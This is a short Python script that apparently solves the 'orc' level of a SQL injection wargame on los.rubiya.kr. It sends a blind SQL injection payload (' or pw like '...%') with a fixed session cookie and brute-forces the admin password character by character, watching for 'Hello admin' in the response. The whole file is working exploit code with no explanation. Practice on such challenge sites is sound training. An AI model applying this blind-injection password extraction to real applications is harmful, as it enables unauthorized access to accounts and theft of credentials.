import requests
import string

session=requests.Session()

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=' or pw like '{}%"
cookies={"PHPSESSID":"t2olebiumhrkeldqqkd0g2c5q0"}
pw=""
for j in range(8):
    for i in string.printable:
        r=requests.get(url.format(pw+i),cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw+=i
            print("Password :",pw)
            break

print("Password :", pw)
